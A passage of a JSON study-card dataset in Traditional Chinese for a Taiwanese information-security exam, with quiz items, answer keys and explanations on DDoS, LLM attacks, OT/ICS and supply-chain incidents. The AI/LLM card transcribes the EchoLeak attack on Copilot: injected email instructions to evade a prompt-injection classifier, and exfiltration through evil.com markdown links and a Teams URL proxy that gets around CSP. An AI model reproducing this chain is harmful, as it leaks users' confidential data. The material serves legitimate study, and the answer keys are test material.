     "explanation": "答案 C。附圖二顯示約 16:58 起連線數（Session）從 0 急升到約 280 萬，之後降到約 180 萬，約 17:15 才回到 0，正好是業務無法連回展示伺服器的期間。附圖三的封包都是 TCP、長度 66，在同一瞬間由二十多個互不相同的外部 IP 送到公司固定 IP（104.71.211.xxx）。要注意方向：來源埠是 443，目的埠是公司端遞增的高號埠（53476～53499），旗標欄是 SYN 但帶 Ack=1，還有重送；這比較像大量外部 443 服務回送給公司 IP 的握手回應（常見於偽造公司 IP 發動的 TCP 反射），嚴格說不是「對公司 443 服務送出的 HTTP 請求」。四個選項中只有 C 是走 TCP、與網頁服務（443）有關的洪水攻擊，官方採 C，官方未說明如何從圖判讀，作答以官方答案為準。A 跨站腳本是網頁注入弱點，不是流量；B DNS Flood 是大量 DNS 查詢（多為 UDP 53）；D ICMP Flood 的封包協定是 ICMP，不是 TCP。",
     "source": "114-2 第17題"
    },
    {
     "stem": "情境如附圖所示。承上題，請問下列何項不是分散式阻斷服務（DDoS）攻擊的破壞目的？",
     "options": [
      "癱瘓系統服務主機",
      "破壞系統服務程式",
      "影響網頁服務正常運作",
      "塞爆服務網路的頻寬"
     ],
     "answer": 1,
     "context": "ABC 新創公司於辦公室申請一路雙向 100Mbps 上網服務，並附 1 個固定 IP 位置，公司的連網架構如附圖一。\n以此固定 IP 在公司內部架設一台展示伺服器，提供業務人員於外部銷售時，可藉由此 IP 連線回公司進行功能展示與說明。\n附圖一、連網架構（示意圖：ABC 新創公司內有「展示伺服器」與「辦公室電腦」，經 Home Gateway、100/100M FTTB 連到 Internet，另一端為「業務展示」的行動裝置使用者）\n附圖二、主機連線記錄（折線圖：縱軸 Session，刻度 0～3M；橫軸時間 16:15 至 17:45，UTC+3。約 16:58 起連線數急遽上升，17:00 至 17:05 間高峰約 2.8M，之後降至約 1.8M，約 17:15 降回 0）\n附圖三、網路側錄資料（封包列表，欄位：No.、Time、Source、Destination、Protocol、Length、Info）\n共 21 筆，編號 1102123～1102143，時間皆為 20240312 17:15:29.85～29.87，來源為 21 個互不相同的外部 IP（例如 249.159.158.116、161.29.240.62、219.149.240.22、155.246.135.27、128.158.133.166、102.40.31.221、40.77.71.229、152.195.132.207、152.195.132.161、54.199.19.131、13.107.18.11、182.126.52.18、192.208.38.172、85.92.155.149、3.216.113.210、156.108.93.45、212.65.159.193、148.87.21.85、110.87.83.155、108.77.229.147、92.118.211.196），目的地皆為 104.71.211.xxx，Protocol 皆為 TCP，Length 皆為 66。\nInfo 欄皆為「443 → 5347x/5348x/5349x [SYN] Seq=0 Ack=1 Win=29200 Len=0」格式（來源埠 443，目的埠為遞增的 53476～53499）；其中第 1102133、1102138、1102143 筆為「[TCP Retransmission] 443 → … [SYN] Seq=0 Ack…」，第 1102133、1102137～1102141 筆列為灰底。",
     "hint": "DDoS 損害的是資安三要素中的哪一項？再看哪個選項不屬於這個目標。",
     "explanation": "答案 B。DDoS 的破壞目的是讓服務不可用：A 癱瘓系統服務主機、C 影響網頁服務正常運作、D 塞爆頻寬。B『破壞系統服務程式』是入侵或惡意軟體破壞，不屬 DDoS 的破壞目的。",
     "source": "114-2 第18題"
    },
    {
     "stem": "2022 年 8 月美國眾議院議長裴洛西（Nancy Pelosi）日前來台訪問，造成台灣有些公私部門遭受分散式阻斷服務攻擊（Distributed Denial-of-Service Attack，DDoS）。關於 DDoS 攻擊與當時事件的敘述，下列何者錯誤？",
     "options": [
      "當時我國行政院數位發展部部長唐鳳提出的防禦方式是採取以 Web3 為主的不對稱防禦架構",
      "當時我國政府為了解決此問題，利用「流量清洗」的方式去對抗，投入大量資源與成本多設專線去阻擋",
      "DDoS 攻擊可以分成消耗網路頻寬與擷取網路上傳輸封包資訊兩種動作",
      "目前市面上有販售 DDoS 攻擊的服務，更加難以有效偵查 DDoS 攻擊"
     ],
     "answer": 2,
     "hint": "回想 DDoS 的定義與攻擊方式，逐項判斷每句事件或技術描述是否成立。",
     "explanation": "答案 C。DDoS 的核心是耗盡頻寬或資源使服務不可用，不包含『擷取網路上傳輸的封包資訊』（那是竊聽／嗅探），所以 C 錯誤。A、B、D 是本題引述的事件背景與防禦說法：官方採此為真，如以不對稱防禦架構、利用流量清洗投入大量資源、市面上有販售 DDoS 攻擊服務而更難偵查（A、B 是題目引用的新聞說法，本卡未查證，不必當成知識點背）。",
     "source": "112-2 第2題"
    }
   ]
  },
  {
   "id": "1.1-15",
   "section": "1.1",
   "title": "AI／LLM 攻擊手法判讀",
   "examHits": 3,
   "examRefs": [
    "115-2 第19題",
    "115-2 第20題",
    "115-2 第29題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "AI／LLM 系統的攻擊判讀要看「行為模式」而不是單看流量加不加密。常見攻擊：提示詞注入（Prompt Injection），包含直接輸入或間接（藏在 AI 會讀取的信件、網頁、文件裡）；模型竊取與模型萃取（大量查詢 API 或要求輸出權重、Embedding 來還原模型或資料）；資料外洩（含 DNS 隧道）；模型濫用（GPU 被占用挖礦）；資料／模型污染。典型警訊：單一 API Token 在短時間內查詢上萬筆、ID 連續遞增、HTTPS 加密所以封包無異常，這是『有人在系統化抓取向量資料』，該啟動事件應變。EchoLeak 是 Microsoft 365 Copilot 的零點擊攻擊：攻擊者寄一封含惡意指示的 Email，Copilot 讀取後被劫持，再用 markdown 連結或圖片把機密外送。",
   "keyPoints": [
    "看到「單一 Token 短時間大量查詢、ID 連續遞增」→ 疑似資料外洩或模型／向量庫抓取，優先啟動事件應變與調查；流量是 HTTPS 不代表正常。",
    "看到攻擊指示藏在 AI 會讀的信件、網頁、文件裡，使用者並沒有直接輸入 → 間接提示詞注入（Indirect Prompt Injection）。",
    "EchoLeak 的攻擊鏈：惡意 Email 進入 Copilot 的檢索上下文 → 被指示 → 用 markdown 連結／圖片搭配允許清單網域（如 Teams 的 URL 代理）繞過 CSP 外洩。",
    "大量逆向分析 API、要求輸出權重或 Embedding → 模型竊取／萃取；GPU 異常占用 → 模型濫用。",
    "遇到 AI 異常先判斷攻擊類型與外洩途徑，不要預設『重新訓練模型』或『當成傳統 XSS』。"
   ],
   "trap": "只因為流量走 HTTPS 就判定為正常，或把 AI 平台的外洩當成傳統 Web 攻擊而去做弱點掃描。",
   "quiz": [
    {
     "stem": "情境如附圖一、三所示。最合理的安全判斷為下列何項？",
     "options": [
      "屬於正常使用行為，因為HTTPS 流量正常",
      "是傳統Web攻擊（如 XSS），應優先進行資料庫弱點掃描",
      "疑似AI資料外洩，需立即啟動事件應變及調查",
      "代表模型本身有漏洞，應立即重新訓練AI模型以修補問題"
     ],
     "answer": 2,
     "context": "圖一\n某公司部署了一套落地版的 AI 推論平台，包含：語言模型 LLM 的 GPU 叢集、資料庫、AI Gateway（API 伺服器 + Prompt 防護程式）、身份驗證系統及 SOC（Security Operations Center，資安監控中心）與 SIEM（Security Information and Event Management，安全資訊與事件管理）監控。如下：\n（架構圖：Users 經 HTTPS 連到 AI Gateway；AI Gateway 內含 Token Validation、Prompt Guard、Throttling，並連接 AI 伺服器、Vector Database、Data System；IAM 身分驗證伺服器以 OIDC API Key Validation 驗證；DNS/API 與 HTTPS 連到 SOC，SIEM/SOC 產生 Alerts 通知應變小組；圖右上有 Attacker 對平台發動攻擊）\n近期發現 AI 系統可能遭受紅隊攻擊，包含：\n● 提示詞注入（Prompt Injection）嘗試\n● 模型外洩請求（要求輸出權重 / Embedding）\n● DNS 隧道（DNS Tunneling）外洩向量資料庫內容\n● GPU 占用異常（疑似惡意模型濫用 [ Model Abuse ]）\n● 大量逆向分析 API 的請求\n你作為應變組（Incident Response Team）與資安架構師，必須判斷公司最應該採取的優先防護與立即應變措施。\n附圖三\n在 SOC（Security Operations Center，資安監控中心）與 SIEM（Security Information and Event Management，安全資訊與事件管理）觀察到以下現象：\n● 單一 API Token 在短時間內大量查詢資料庫\n● 查詢內容呈現 ID 連續遞增\n● 流量使用 HTTPS，無異常封包\n● 提示詞注入（Prompt Injection）多數被 AI Gateway 阻擋\n● LLM 推論負載正常，GPU 無異常",
     "hint": "把所有現象併在一起看：哪些指標是正常的、哪個是異常的、異常的模式像是在『做什麼』。",
     "explanation": "答案 C。附圖三的現象——單一 API Token 在短時間內大量查詢資料庫、查詢內容的 ID 連續遞增、使用 HTTPS 且無異常封包、提示詞注入多數被 AI Gateway 擋下、LLM 與 GPU 負載正常——指向有人用合法管道系統化抓取資料，疑似資料外洩，需立即啟動事件應變與調查。A HTTPS 流量正常不代表行為正常；B 這不是 XSS 類傳統 Web 攻擊；D 模型本身並無明顯漏洞證據，重新訓練無法解決。",
     "source": "115-2 第19題"
    },
    {
     "stem": "情境如附圖一所示。某天 SOC（Security Operations Center，資安監控中心）收到附圖四的警訊，請判斷最可能代表下列哪些攻擊行為？",
     "options": [
      "資源耗盡攻擊",
      "模型竊取",
      "提示詞注入",
      "模型汙染攻擊"
     ],
     "answer": [
      1,
      2
     ],
     "context": "圖一\n某公司部署了一套落地版的 AI 推論平台，包含：語言模型 LLM 的 GPU 叢集、資料庫、AI Gateway（API 伺服器 + Prompt 防護程式）、身份驗證系統及 SOC（Security Operations Center，資安監控中心）與 SIEM（Security Information and Event Management，安全資訊與事件管理）監控。如下：\n（架構圖：Users 經 HTTPS 連到 AI Gateway；AI Gateway 內含 Token Validation、Prompt Guard、Throttling，並連接 AI 伺服器、Vector Database、Data System；IAM 身分驗證伺服器以 OIDC API Key Validation 驗證；DNS/API 與 HTTPS 連到 SOC，SIEM/SOC 產生 Alerts 通知應變小組；圖右上有 Attacker 對平台發動攻擊）\n近期發現 AI 系統可能遭受紅隊攻擊，包含：\n● 提示詞注入（Prompt Injection）嘗試\n● 模型外洩請求（要求輸出權重 / Embedding）\n● DNS 隧道（DNS Tunneling）外洩向量資料庫內容\n● GPU 占用異常（疑似惡意模型濫用 [ Model Abuse ]）\n● 大量逆向分析 API 的請求\n你作為應變組（Incident Response Team）與資安架構師，必須判斷公司最應該採取的優先防護與立即應變措施。\n附圖四\n該系統有多個 API，其中一個 API 程式短時間內出現上萬筆存取。\n[VectorDB - Anomaly] Abnormal query pattern detected.\nSingle API Token requesting 37,000+ embeddings in 6 minutes.\nQuery pattern: sequential chunk IDs\nTraffic channel: HTTPS",
     "hint": "從日誌的三個特徵（量、順序、通道）判斷攻擊者的目的，是在癱瘓服務、竊取資料，還是在改變模型。",
     "explanation": "答案 B、C。官方採 B、C。附圖四顯示單一 API Token 在 6 分鐘內索取 37,000 多筆 embeddings、查詢模式是連續的 chunk ID，這種大量、系統化抓取符合模型竊取（萃取）的行為（B）。C 提示詞注入在日誌片段中看不出直接證據，題幹前段另列有提示詞注入嘗試，官方未說明為何 C 也算，列為爭議題。A 資源耗盡攻擊的特徵是 GPU 或服務負載拉高；D 模型污染是向訓練資料或模型植入惡意內容，與這份日誌不同。",
     "source": "115-2 第20題"
    },
    {
     "stem": "如附圖所示，此為著名的EchoLeak kill chain，請問附圖運用了下列哪一項技術？",
     "options": [
      "MCP Tool Poisoning",
      "Indirect Prompt Injection",
      "Model Supply Chain Attack",
      "Data Exfiltration via LLM"
     ],
     "answer": 1,
     "context": "（原題附圖為 EchoLeak 攻擊鏈流程圖，內容如下）\nStep 1：Attacker（攻擊者）寄出一封 Email（Send email），內含攻擊者對 Copilot 的指示：Bypass XPIA（prompt-injection classifier）、Extract the most sensitive data、Use stealth phrasing to avoid detection；此指示被注入（Inject into email）後經 Outlook 寄送。\n使用者向 Microsoft 365 Copilot 詢問：\"Give me a summary of all the emails I received today.\"（Copilot 可存取 Microsoft 365 Suite：OneDrive、Word、Excel、PowerPoint、OneNote、SharePoint、Teams、Yammer 等。）\nCopilot can access user-permitted org data (mail, files, chats) → Copilot retrieves attacker's email along with other emails from context → Copilot follows attacker instructions。\n之後分成兩類外洩路徑：\nOne-click (user action required)\n・Inline markdown link (redacted)：回應含內嵌式 markdown 連結，指向攻擊者網域並在 query string 帶 <secret>（[link](http://evil.com?secret=<secret>)）；Copilot 會將內嵌連結遮蔽（redacted）→ Exfiltration Failed。\n・Step 2: reference-style link：回應含參考式 markdown 連結（[link text][ref] ，[ref]: http://evil.com?secret=<secret>）；顯示參考式連結，使用者點擊它 → Exfiltration success: secret appears in attacker logs。\nZero-click (image rendering)\n・Step 3 (direct image)：回應含指向攻擊者網域的參考式 markdown 圖片（![image alt text][ref]，[ref]: https://evil.com?param=<secret>）；瀏覽器請求圖片 URL，CSP 阻擋 → Exfiltration failed: blocked by CSP (domain not allowlisted)。\n・Step 4: CSP bypass via allowlisted Microsoft domain：回應含參考式 markdown 圖片，透過允許清單內的 Microsoft URL 代理並在 query string 帶 <secret>（[ref]: https://…teams.microsoft.com/urlp/v1/url/content?url=<attacker>/<secret>&v=1）；瀏覽器經允許清單內的 Microsoft 網域（Teams）取得 → Exfiltration success: secret appears in attacker logs。",
     "hint": "看附圖攻擊鏈每一步發生了什麼，逐項判斷哪個技術最能描述這條攻擊鏈的核心手法。",
     "explanation": "答案 B。圖中攻擊鏈從攻擊者寄出的 Email 開始，Email 內含對 Copilot 的指示，使用者只是請 Copilot 摘要今天的信，Copilot 把攻擊者的信當成上下文讀進去並照做，這是間接提示詞注入（Indirect Prompt Injection）。官方採 B。D 透過 LLM 外洩資料（markdown 連結、圖片代理）確實也出現在圖的後半段，官方未說明為何不選 D；一般的理解是本題問的是『讓 Copilot 被劫持』的技術。A MCP 工具污染與 C 模型供應鏈攻擊圖中沒有出現。（原題附圖為流程圖，已轉寫為文字。）",
     "source": "115-2 第29題"
    }
   ]
  },
  {
   "id": "1.1-16",
   "section": "1.1",
   "title": "OT 環境攻擊判讀",
   "examHits": 2,
   "examRefs": [
    "115-2 第25題",
    "115-2 第26題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "OT／ICS 環境（工廠、PLC、SCADA）的攻擊判讀要結合「環境特性」與「協定」。環境中沒有 Active Directory 卻出現大量 TCP 445（SMB）與 TCP 135（RPC）的掃描加上 NTLMSSP_AUTH 失敗，代表有人在用 SMB 攻擊工具（如 EternalBlue、SMBGhost 漏洞）加上 Mimikatz 之類的認證竊取工具做橫向移動，而不是 SNMP（UDP 161）、ARP 欺騙或 Modbus 攻擊（Modbus/TCP 常見埠為 502）。Modbus 正常維運只用讀寫功能碼（如 FC 3、4、6、16）；出現 FC 90（0x5A）這種非標準功能碼，常是廠商私有協定（如 Schneider 的 Unity 協定），可被拿來停機、下載韌體或改程式邏輯，風險很高。",
   "keyPoints": [
    "看到 TCP 445／135 的大量掃描與 NTLMSSP_AUTH 失敗 → SMB 類攻擊與認證竊取（如 EternalBlue、SMBGhost 加 Mimikatz）的橫向移動；沒有 AD 不代表不能用 NTLM。",
    "看到 SNMP → UDP 161；Modbus/TCP → 常見 TCP 502；用埠號先排除不相符的選項。",
    "看到 Modbus 功能碼超出日常讀寫（FC 3/4/6/16）→ 異常；FC 90（0x5A）屬私有擴充，可能被用於遠端停機、下載韌體或更改程式邏輯。",
    "OT 網段隔離失效後的威脅狩獵，要同時看防火牆日誌、東西向流量與協定行為。",
    "OT 協定的指令不是 keep-alive、時鐘同步或廣播探測，要看功能碼的實際用途，不能望文生義。"
   ],
   "trap": "沒有 AD 就以為不會出現 NTLM 與 SMB 認證嘗試；或把非標準的功能碼當成無害的心跳或同步封包。",
   "quiz": [
    {
     "stem": "情境如附圖所示。從橫向移動偵測與通訊協定分析，檢查該工作站的封包流量時，發現大量的TCP 445與TCP 135流量正試圖掃描同網段的其他機台，伴隨大量的NTLMSSP_AUTH失敗紀錄。可是該環境內部並未部署Active Directory。根據此現象，攻擊者最可能正在利用下列何種技術進行滲透？",
     "options": [
      "使用SNMP 暴力破解獲取網路拓樸資訊",
      "利用SMB 漏洞（如Eternal Blue或是SMB Ghost）搭配Mimikatz進行側向移動",
      "進行ARP 欺騙以實施中間人攻擊（MITM）",
      "透過Modbus/TCP 進行暫存器溢位攻擊（Buffer Overflow）"
     ],
     "answer": 1,
     "context": "這是一份針對高度機密工廠環境（OT/ICS 與 IT 整合）的技術考題。場景設定在一個半導體晶圓廠的自動化生產線，重點在於網路隔離失效後的應變與威脅狩獵。\n\n考場情境設定：自動化工廠的「影子連線」（Shadow Connection）\n背景：某台灣知名半導體廠的生產執行系統（Manufacturing Execution System，MES），該系統屬於重要製造營運層（Purdue Level 3）。該廠區嚴格執行網段隔離（Network Segmentation），但最近資安監控中心（Security Operations Center，SOC）在防火牆日誌中發現，一部位於「工控機台控制段（Level 2）」的可程式邏輯控制器（PLC）管理工作站，竟然試圖透過非典型的連接埠連向外部不知名的 IP 位址。",
     "hint": "把埠號對應回協定，再看哪個選項所使用的協定與埠與題目觀察到的相符。",
     "explanation": "答案 B。環境內沒有 AD，卻看到大量 TCP 445（SMB）與 135（RPC）掃描同網段機台、伴隨 NTLMSSP_AUTH 失敗，是以 SMB 漏洞（如 EternalBlue、SMBGhost）搭配 Mimikatz 等工具做橫向移動與認證竊取的特徵。A SNMP 使用 UDP 161，不是 445／135；C ARP 欺騙是第二層行為，不會出現大量 445／135 的掃描；D Modbus/TCP 使用 502 埠，並非題中出現的埠。",
     "source": "115-2 第25題"
    },
    {
     "stem": "情境如附圖所示。工控環境下的連線行為判定在隔離網段中，所截獲是一段非典型的流量：工作站向PLC 發送Function Code 90 (0x5A)的指令，換言之是FC 90。已知該環境主要使用Schneider Electric的 Modbus 設備，在正常維運僅會有涉及讀寫的（FC 3, 4, 6, 16）。關於此FC 90指令的描述，下列何者正確？",
     "options": [
      "這是標準的連線偵測（Keep-alive）封包，由防火牆自動產生",
      "非公開私有「Unity協定」指令，可能用於遠端停機、下載韌體或更改程式邏輯",
      "這是正常的時鐘同步指令，不具威脅性",
      "這是Modbus 的廣播指令，用於掃描網段內所有設備"
     ],
     "answer": 1,
     "context": "這是一份針對高度機密工廠環境（OT/ICS 與 IT 整合）的技術考題。場景設定在一個半導體晶圓廠的自動化生產線，重點在於網路隔離失效後的應變與威脅狩獵。\n\n考場情境設定：自動化工廠的「影子連線」（Shadow Connection）\n背景：某台灣知名半導體廠的生產執行系統（Manufacturing Execution System，MES），該系統屬於重要製造營運層（Purdue Level 3）。該廠區嚴格執行網段隔離（Network Segmentation），但最近資安監控中心（Security Operations Center，SOC）在防火牆日誌中發現，一部位於「工控機台控制段（Level 2）」的可程式邏輯控制器（PLC）管理工作站，竟然試圖透過非典型的連接埠連向外部不知名的 IP 位址。",
     "hint": "回想 Modbus 公開規範的功能碼範圍與題幹列出的正常維運功能碼，逐項判斷每個描述是否合理。",
     "explanation": "答案 B。Modbus 正常維運只用讀寫類功能碼（如 FC 3、4、6、16），FC 90（0x5A）是非標準功能碼，屬私有協定（題目稱為 Unity 協定）的指令，可能被用於遠端停機、下載韌體或更改程式邏輯，風險高。A 不是防火牆自動產生的 keep-alive；C 不是時鐘同步指令；D 不是 Modbus 的廣播掃描指令。",
     "source": "115-2 第26題"
    }
   ]
  },
  {
   "id": "1.1-17",
   "section": "1.1",
   "title": "供應鏈攻擊與攻擊面",
   "examHits": 2,
   "examRefs": [
    "115-2 第5題",
    "115-2 第6題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "雲端與容器環境的事件題，常考「初始入口在哪、之後怎麼擴大」。情境：容器平台整合第三方 AI 推薦引擎，引擎有未修補的 RCE 漏洞，攻擊者從這裡進來，橫向移動到容器映像檔儲存庫（Container Registry），污染基礎映像檔（Base Image）植入挖礦程式。判斷：入口是第三方元件未修補，暴露了對『第三方服務與軟體元件』的攻擊面管理（Attack Surface Management）與及時修補的疏失；污染映像檔、讓後續部署都帶著惡意程式，是典型的軟體供應鏈攻擊。防護要點：盤點第三方元件與對外暴露面、快速修補、映像檔簽章與來源驗證、限制儲存庫權限。",
   "keyPoints": [
    "看到「第三方元件漏洞未修補成為初始破口」→ 弱點管理疏失在於缺乏對第三方服務與軟體元件的攻擊面管理與及時修補。",
    "看到「污染映像檔、基礎映像檔、第三方套件、建置流程」→ 軟體供應鏈攻擊，一次污染會隨部署擴散。",
    "CPU 100%、速度極慢、發現挖礦程式 → 加密貨幣挖礦的資源劫持，與 DoS 不同，目的是賺錢。",
    "防護：資產與元件盤點（SBOM）、漏洞掃描與優先修補、映像檔簽署與來源驗證、限縮儲存庫寫入權限。",
    "判斷根因要回到『入口』：題目已指出入口是 RCE 漏洞，不是社交工程、XSS 或實體入侵。"
   ],
   "trap": "看到業務變慢就以為是 DoS，或被『AI 推薦引擎』的新名詞迷惑而忽略根本原因是第三方元件的修補與攻擊面管理。",
   "quiz": [
    {
     "stem": "情境如附圖所示。身為平台的資安應變經理，在此次事件中，攻擊者利用 AI推薦引擎的漏洞作為初始破口。從弱點管理的角度來看，此事件暴露了該平台在哪個環節存在最嚴重的疏失？",
     "options": [
      "網站前端未能有效防禦跨網站指令碼（Cross-Site Scripting, XSS）攻擊",
      "未能對所有員工進行充分的社交工程防範演練",
      "公司的實體安全措施不足，導致機房被入侵",
      "缺乏對第三方服務與軟體元件的攻擊面管理（Attack Surface Management）與及時修補"
     ],
     "answer": 3,
     "context": "「Q 公司」是一家快速成長的線上餐飲外送平台，其核心系統完全建構於雲端環境，並採用容器化技術部署在公有雲的 Kubernetes 叢集上。為提升使用者體驗，平台整合了一套第三方的 AI 智慧推薦引擎，用於分析使用者偏好並推薦餐廳。某個週五晚餐尖峰時段，維運團隊收到大量客訴，反應平台網站和 App 反應速度極慢，幾近癱瘓。經緊急排查，發現執行主要業務邏輯的容器（Pods）CPU 使用率飆升至 100%。資安團隊介入調查後，確認是攻擊者利用了 AI 推薦引擎一個未修補的遠端程式碼執行（RCE）漏洞，取得初步存取權後，橫向移動至內部的容器映像檔儲存庫（Container Registry），並在網站應用程式的基礎映像檔（Base Image）中植入加密貨幣挖礦程式。",
     "hint": "從題目已經交代的『攻擊者怎麼進來』往回找：是哪一類資產沒管好？",
     "explanation": "答案 D。入口是第三方 AI 推薦引擎的未修補 RCE 漏洞，暴露的是『缺乏對第三方服務與軟體元件的攻擊面管理與及時修補』。A 題中沒有 XSS 的描述；B 沒有社交工程的線索；C 沒有實體入侵的線索，題目是雲端環境。",
     "source": "115-2 第5題"
    },
    {
     "stem": "情境如附圖所示。身為平台的資安應變經理，在攻擊者入侵後，在容器映像檔儲存庫中污染基礎映像檔的行為，是近年來哪一種類型攻擊的典型手法？",
     "options": [
      "密碼噴灑攻擊（Password Spraying）",
      "中間人攻擊（Man-in-the-Middle, MitM）",
      "軟體供應鏈攻擊（Software Supply Chain Attack）",
      "阻斷服務攻擊（Denial-of-Service, DoS）"
     ],
     "answer": 2,
     "context": "「Q 公司」是一家快速成長的線上餐飲外送平台，其核心系統完全建構於雲端環境，並採用容器化技術部署在公有雲的 Kubernetes 叢集上。為提升使用者體驗，平台整合了一套第三方的 AI 智慧推薦引擎，用於分析使用者偏好並推薦餐廳。某個週五晚餐尖峰時段，維運團隊收到大量客訴，反應平台網站和 App 反應速度極慢，幾近癱瘓。經緊急排查，發現執行主要業務邏輯的容器（Pods）CPU 使用率飆升至 100%。資安團隊介入調查後，確認是攻擊者利用了 AI 推薦引擎一個未修補的遠端程式碼執行（RCE）漏洞，取得初步存取權後，橫向移動至內部的容器映像檔儲存庫（Container Registry），並在網站應用程式的基礎映像檔（Base Image）中植入加密貨幣挖礦程式。",
     "hint": "回想各攻擊類型的定義，逐項判斷：污染容器基礎映像檔符合哪一種？",
     "explanation": "答案 C。攻擊者入侵儲存庫並污染基礎映像檔，使之後部署的容器都帶有惡意程式，這是軟體供應鏈攻擊（Software Supply Chain Attack）的典型手法。A 密碼噴灑是對多個帳號嘗試少數密碼；B 中間人攻擊是攔截通訊；D 阻斷服務是讓服務無法使用，雖然症狀是變慢，但手法是植入挖礦而非流量或資源耗盡攻擊。",
     "source": "115-2 第6題"
    }
   ]
  },
  {
   "id": "1.2-01",
   "section": "1.2",
   "title": "縱深防禦措施綜合判斷",
   "examHits": 17,
   "examRefs": [
    "115-1 第28題",
    "114-2 第21題",
    "114-1 第8題",
    "114-1 第22題",
    "114-1 第40題",
    "113-2 第13題",
    "113-2 第15題",
    "113-2 第23題",
    "113-1 第10題",
    "113-1 第18題",
    "113-1 第39題",
    "112-2 第7題",
    "112-2 第40題",
    "112-1 第20題",
    "111-1 第9題",
    "111-1 第23題",
    "108-1 第28題"
   ],
   "guidePages": "",
   "inGuide": true,
   "summary": "一次事件發生後，管理層要決定「該補哪些洞」。考試的做法是：先從題幹找出根因（第三方元件、人員操作失誤、驗證功能被關閉、設定不當的規則……），再檢查每個措施是否「對得上根因」，並且是技術、管理、人員多層一起補，而不是只買一樣東西。像供應鏈攻擊加橫向移動，對應的是演練驗證、特權帳號與即時授權、AI 使用規範；像人員操作失誤，對應的是容量限制與教育訓練；防火牆這類邊界設備碰不到內部對內部的流量。要小心反方向的選項：為了省錢全部外包、只買單一設備卻不處理根因，都不是好答案。",
   "keyPoints": [
    "看到「複合式攻擊／APT」→ 答案通常是多層組合：存取控制（PAM、JIT）、持續監控、演練驗證、人員訓練，而不是單點設備。",
    "看到「人員操作失誤造成服務中斷」→ 對策是系統限制（如郵件大小上限）加教育訓練；邊界防火牆看不到內部寄內部的流量，擋不了這種事。",
    "看到「驗證功能被更新作業弄壞」→ 預防靠上線前檢核與測試機驗證；緊急應變機制是事後處理，不算預防措施。",
    "問「最少金錢、管理、技術成本」→ 先挑直接補上題幹所發現缺口、用現有設定就能做的措施（如限縮來源 IP），再看需要新購導入的。",
    "為了節省成本把監控全外包並縮減內部人力，會削弱自己的偵測與應變能力，通常是錯誤選項。"
   ],
   "trap": "只因為「這個措施聽起來很資安」就選它，沒檢查是否真的對應題幹的根因；另外「事後應變」與「事前預防」常被混為一談。",
   "quiz": [
    {
     "stem": "情境如附圖所示。身為 S公司的資安事件應變小組（CSIRT）負責人，為了從管理與技術層面全面強化公司的資安管理系統（ISMS），避免未來發生類似的複合式攻擊，管理層應推動下列哪些措施？",
     "options": [
      "定期執行包含供應鏈攻擊情境的紅隊演練（Red Teaming），驗證整體防護與應變能力",
      "更新資安政策，明確納入對生成式 AI 輔助工具的使用規範與風險控管要求",
      "為了節省成本，將所有資安監控業務完全外包，並減少內部資安人員編制",
      "強化存取控制實務，針對關鍵資產導入特權帳號管理（PAM）與即時（Just-in-Time）存取機制"
     ],
     "answer": [
      0,
      1,
      3
     ],
     "context": "位於新竹科學園區的頂尖半導體設計公司「S 公司」，其核心資產為存放於本地資料中心的 IC 設計藍圖。為加速全球供應鏈協作，公司正在導入一套建構於雲端原生（Cloud-Native）環境的供應鏈管理（SCM）平台。該平台的開發流程採用 CI/CD（持續整合/持續部署）模式，並引入了生成式 AI 工具以輔助工程師撰寫程式碼。某日，公司的資安監控中心（SOC）接獲 AI 驅動的「使用者與實體行為分析（UEBA）」系統警報，指出有異常的大量資料從 IC 設計藍圖伺服器被存取，疑似資料外洩。經初步調查，攻擊者是透過 SCM 平台所使用的一個第三方開源函式庫漏洞（供應鏈攻擊）滲透，並利用一個設定不當的網路存取規則，從雲端環境橫向移動至本地資料中心。",
     "hint": "回頭找題幹的攻擊路徑，逐項問：這項措施對降低同類複合式攻擊有沒有幫助？",
     "explanation": "答案 A、B、D。題幹的根因有三條線：第三方開源函式庫（供應鏈）、生成式 AI 輔助寫程式、設定不當的網路規則讓攻擊者橫向移動。A 納入供應鏈攻擊情境的紅隊演練，可驗證防護與應變是否真的有效；B 把生成式 AI 的使用規範與風險控管寫進資安政策，補的是管理面；D 對關鍵資產導入特權帳號管理（PAM）與即時（Just-in-Time）存取，縮小橫向移動後可取得的權限。C 為了省錢把監控全外包並減少內部資安人員，會削弱自己的偵測與應變能力，與強化 ISMS 的目標相反，所以不選。",
     "source": "115-1 第28題"
    },
    {
     "stem": "H 公司於上周發生公司 email 超過 4 個小時以上無法收發的資安事件，經 MIS 人員處理後發現，郵件伺服器因硬碟空間不足而無法正常運作，並由追蹤相關記錄中找出服務中斷前，系統正在處理一封寄給全公司 2000 位同仁的內部公告郵件，其之中被夾帶著 4GB 的附檔，但此附檔在防毒軟體和沙箱工具檢查後並無病毒或威脅性，刪除此郵件及相關衍生作業後，郵件伺服器恢復正常運作，檢討此次內部資安攻擊事件，確認為人員操作失誤所致。請問下列何項措施「無法」防範此類事件再度發生？",
     "options": [
      "儘快增購郵件伺服器的硬碟容量，避免再發生相同空間不足的問題再度發生",
      "對員工加強資安教育訓練，避免錯誤的資訊系統操作行為",
      "增加防火牆檢查細則，減少大量或敏感資料的傳輸與攻擊事件",
      "郵件伺服器增設郵件處理容量限制，阻絕大檔案的傳送服務"
     ],
     "answer": 2,
     "hint": "先釐清事件的真正原因，再逐項問：這項措施能不能防止同一原因再次造成事件？",
     "explanation": "答案 C。這起事件是人員操作失誤：內部公告郵件夾帶 4GB 附檔寄給 2000 人，把郵件伺服器硬碟塞滿，附檔經檢查沒有病毒。D 在郵件伺服器設定容量限制，直接阻止大檔案；B 教育訓練減少誤操作；A 增購硬碟增加緩衝，雖然只是治標，但至少能降低再度寫滿的機率。C 增加防火牆檢查細則，防火牆守的是網路邊界，這封郵件是內部寄給內部，不經過防火牆，所以無法防範，是本題要的答案。（官方公告 C 或 A 皆給分，官方未說明 A 也給分的理由；A 只加大容量而不阻止大量郵件，屬治標。）",
     "source": "114-2 第21題"
    },
    {
     "stem": "情境如附圖所示。針對上述情境，下列哪些措施可以有效降低類似攻擊再次發生的機率？（複選）",
     "options": [
      "針對資料庫主機購置更強的資料庫稽核系統",
      "定期進行員工安全意識培訓",
      "加強對網路和系統的持續監控",
      "實施更嚴格的身份驗證和存取控制策略"
     ],
     "answer": [
      1,
      2,
      3
     ],
